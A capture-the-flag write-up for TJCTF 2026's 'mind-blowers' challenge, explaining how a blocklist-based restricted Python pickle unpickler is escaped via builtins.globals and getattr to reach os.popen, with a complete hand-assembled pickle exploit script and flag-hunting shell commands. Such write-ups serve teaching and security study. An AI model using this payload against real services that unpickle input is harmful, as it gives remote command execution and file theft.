# mind-blowers

**Author:** Jordan Lanham
**Event:** TJCTF 2026
**Category:** misc
**Date:** May 15, 2026
**Read Time:** 6 minutes

---

## Overview

A restricted Python `pickle` deserializer service that allows only the `builtins` module and blacklists a handful of dangerous names (`eval`, `exec`, `compile`, `__import__`, `open`, `breakpoint`, `input`, `exit`, `quit`). The unpickled result is stringified back to the client. Escape the sandbox by chaining `builtins.globals()` (which returns the *caller's* module globals — `server.py`'s namespace) to reach `pickle.sys.modules['os'].popen('cat /flag.txt').read()`.

## Challenge Description

> Rick has open sourced his mind blowers program!
> Don't upload any malicious mind blowers!
> nc tjc.tf 31422

**Files provided:** `server.py`
**Endpoints:** `nc tjc.tf 31422`

## Initial Analysis

The server reads a base64 blob, decodes it, and feeds it into a `RestrictedUnpickler`:

```python
BLOCKED_NAMES = {"eval","exec","compile","__import__","open","breakpoint","input","exit","quit"}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module != "builtins": raise UnpicklingError("banned")
        if name in BLOCKED_NAMES: raise UnpicklingError("blocked")
        return super().find_class(module, name)
```

The unpickled object is stringified into `f"Here is your memory: {result}\n"` and sent back. So the final value left on the pickle stack at `STOP` is what we receive — we want that to be the flag contents.

## Solution Approach

### Step 1: Reconnaissance

Allowed: anything in `builtins` except the 9 blacklisted names. Notably **not** blocked: `getattr`, `globals`, `vars`, `setattr`, `delattr`, `print`, `format`. That's plenty.

### Step 2: Vulnerability Identification

`builtins.globals` is a callable. When invoked via pickle's `REDUCE` opcode, Python evaluates the function with **the calling frame's globals** — i.e. the `server.py` module namespace. That namespace contains the imported `pickle` module reference. From `pickle`, we can reach `pickle.sys`, then `sys.modules['os']`, then `os.popen`.

### Step 3: Exploitation

Build the pickle by hand using only `c`/`R`/`(`/`t`/`V`/`q`/`h`/`.` opcodes:

1. `c builtins\nglobals\n` + `)` + `R` → call `globals()` → server's module dict.
2. `getattr(g, 'get')` → bound method.
3. `g.get('pickle')` → the imported `pickle` module.
4. `getattr(pickle, 'sys')` → `sys` (pickle.py does `import sys`).
5. `getattr(sys, 'modules')` → the modules dict.
6. `modules.get('os')` → `os` module.
7. `getattr(os, 'popen')` → `os.popen`.
8. `os.popen('cat /flag.txt')` → file-like object.
9. `getattr(..., 'read')` then call with `()` → flag string.

The string is left on the stack at `STOP` and returned as `result`.

### Step 4: Flag Extraction

A first attempt with `cat flag.txt` returned empty (server CWD is `/app` which holds only `server.py`). An exploratory command `ls -la; pwd; cat flag*; cat /flag*; find / -name flag* | head` printed `/flag.txt` and revealed the flag in its body.

## Code / Exploit

```python
#!/usr/bin/env python3
import base64, socket

p = b''
p += b'cbuiltins\nglobals\n)R'                # g = globals() of server.py
p += b'q\x00'
p += b'cbuiltins\ngetattr\n(h\x00Vget\ntR'   # g.get
p += b'q\x01'
p += b'h\x01(Vpickle\ntR'                     # g.get('pickle') -> pickle module
p += b'q\xff'
p += b'cbuiltins\ngetattr\n(h\xffVsys\ntR'   # pickle.sys
p += b'q\x02'
p += b'cbuiltins\ngetattr\n(h\x02Vmodules\ntR'  # sys.modules
p += b'q\x03'
p += b'cbuiltins\ngetattr\n(h\x03Vget\ntR'   # modules.get
p += b'q\x04'
p += b'h\x04(Vos\ntR'                         # -> os module
p += b'q\x05'
p += b'cbuiltins\ngetattr\n(h\x05Vpopen\ntR' # os.popen
p += b'q\x06'
p += b'h\x06(Vcat /flag.txt\ntR'              # os.popen('cat /flag.txt')
p += b'q\x07'
p += b'cbuiltins\ngetattr\n(h\x07Vread\ntR'  # popen_obj.read
p += b'q\x08'
p += b'h\x08)R.'                              # .read() -> flag string, STOP

b64 = base64.b64encode(p)
s = socket.socket(); s.connect(('tjc.tf', 31422))
s.recv(4096)
s.sendall(b64 + b'\n')
print(s.recv(4096).decode())
```

## Technical Details

- **Vulnerability class:** Restricted-pickle deserialization escape.
- **Encryption / encoding:** Base64-wrapped pickle protocol 0/1 opcodes.
- **Protocol:** Plain TCP, one shot per connection.
- **Key trick:** `builtins.globals` returns the *caller's* module globals at the moment the `REDUCE` opcode invokes it — that's `server.py`'s namespace, which already imported `pickle`. From there we reach `pickle.sys.modules['os']` without ever calling `__import__`, `eval`, `exec`, or `compile`.

## Key Insights

- A blocklist that only filters `find_class` names is not enough — `getattr` plus any reachable module reference is a complete escape primitive.
- `builtins.globals()` is a quietly powerful gadget: it picks up whatever module's globals contain the caller frame. In a sandboxed unpickler this is usually the unpickler's own module.
- The final value on the pickle stack at `STOP` is what `pickle.load()` returns — useful when the server stringifies the result for you.

## The Flag

```
tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}
```

## Resources

- [Python pickle module documentation](https://docs.python.org/3/library/pickle.html)
- [Dangerous Pickles by David Reid](https://intoli.com/blog/dangerous-pickles/)
- [pickletools module](https://docs.python.org/3/library/pickletools.html)
